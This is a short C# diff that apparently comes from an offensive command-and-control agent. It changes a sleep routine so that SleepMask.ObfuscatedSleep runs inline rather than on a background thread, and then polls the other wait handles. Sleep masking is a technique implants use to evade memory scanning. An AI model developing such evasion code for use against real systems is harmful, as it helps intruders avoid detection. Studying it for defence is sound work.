@@ -86,26 +86,8 @@ namespace ApolloInterop.Classes
 
             if (sleepTime > 0 && SleepMask.IsAvailable)
             {
-                ManualResetEvent maskDone = new ManualResetEvent(false);
-                Thread maskThread = new Thread(() =>
-                {
-                    try
-                    {
-                        SleepMask.ObfuscatedSleep((uint)sleepTime);
-                    }
-                    catch { }
-                    finally
-                    {
-                        maskDone.Set();
-                    }
-                });
-                maskThread.IsBackground = true;
-                maskThread.Start();
-
-                WaitHandle[] combined = new WaitHandle[sleepers.Length + 1];
-                combined[0] = maskDone;
-                Array.Copy(sleepers, 0, combined, 1, sleepers.Length);
-                WaitHandle.WaitAny(combined);
+                SleepMask.ObfuscatedSleep((uint)sleepTime);
+                WaitHandle.WaitAny(sleepers, 0);
             }
             else
             {
